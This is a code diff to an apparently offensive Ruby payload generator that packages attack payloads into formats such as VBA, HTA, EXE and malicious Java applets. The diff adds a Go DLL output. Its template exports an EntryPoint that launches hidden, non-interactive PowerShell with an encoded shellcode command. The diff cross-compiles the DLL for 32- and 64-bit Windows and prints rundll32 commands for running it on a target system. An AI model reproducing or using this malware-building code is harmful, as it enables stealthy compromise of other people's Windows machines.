@@ -17,6 +17,7 @@
 # => war (tomcat)
 # => exe (executable) requires MinGW - x86_64-w64-mingw32-gcc [apt-get install mingw-w64]
 # => go (golang executable) requires Golang - go [apt-get install golang-go]
+# => godll (golang dll) requires Golang, can be executed with bins like rundll32.exe
 # => java (for use with malicious java applets)
 # => js (javascript)
 # => js-rd32 (javascript called by rundll32.exe)
@@ -69,7 +70,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, go, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, go, godll, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -438,7 +439,7 @@ puts "final_.exe created!"
 end
 
 
-########################GO_LANG_ENCODE###############################
+########################GO_LANG_EXE################################
 if $lencode == "go"
 
 #determine if Golang has been installed
@@ -483,6 +484,78 @@ system("rm go_file_temp.go")
 system("mv go_file_temp.exe final_go.exe")
 
 puts "final_go.exe created!"
+
+end
+
+#######################GO_LANG_DLL################################
+if $lencode == "godll"
+
+#determine if Golang has been installed
+golang = false
+golang = true if File::exists?('/usr/bin/go')
+if golang == false
+    puts "Must have Go installed in order to compile EXEs!!"
+    puts "\n\tRun to download: apt install golang-go \n"
+    exit 1
+end
+
+#determine if MinGW has been installed, support new and old MinGW system paths
+mingw = false
+mingw = true if File::exists?('/usr/bin/x86_64-w64-mingw32-gcc')
+if mingw == false
+    puts "Must have MinGW installed in order to compile EXEs!!"
+    puts "\n\tRun to download: apt-get install mingw-w64 \n"
+    exit 1
+end
+
+powershell_encoded = gen_PS_shellcode()
+
+goTEMPLATE = %{package main
+
+import(
+    "C"
+    "os/exec"
+)
+
+//export EntryPoint
+func EntryPoint() {
+    c := exec.Command("powershell", "-nop" ,"-win", "Hidden", "-noni", "-e" , "#{powershell_encoded}")
+    c.Run()
+}
+
+func main () {}
+}
+
+#write out to a new file
+go_file_temp = File.new("go_file_temp.go", "w")
+go_file_temp.write(goTEMPLATE)
+go_file_temp.close
+   
+#compiling will require Golang installed - "apt install golang-go"
+puts "compiling..."
+
+
+# thx scott-be!!!!
+# x64: sudo apt install gcc-mingw-w64-x86-64
+#env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -o golang_dll_x64.dll go_file_temp.go
+# x86: sudo apt install gcc-mingw-w64-i686
+#env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -buildmode=c-shared -o golang_dll_x86.dll go_file_temp.go
+
+if $exe_arch == "32"
+    system("env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -buildmode=c-shared -o golang_dll_x86.dll go_file_temp.go")
+else 
+    #system("env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui go_file_temp.go")
+	system("env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -o golang_dll_x64.dll go_file_temp.go")
+
+end
+system("rm go_file_temp.go")
+system("rm golang_dll_x64.h")
+#system("mv go_file_temp.exe final_go.exe")
+
+puts "golang DLL created!"
+puts "To run, execute one of the following on the target system: "
+puts "rundll32.exe golang_dll_x64.dll,EntryPoint"
+puts "rundll32.exe golang_dll_x86.dll,EntryPoint"
 
 end
 
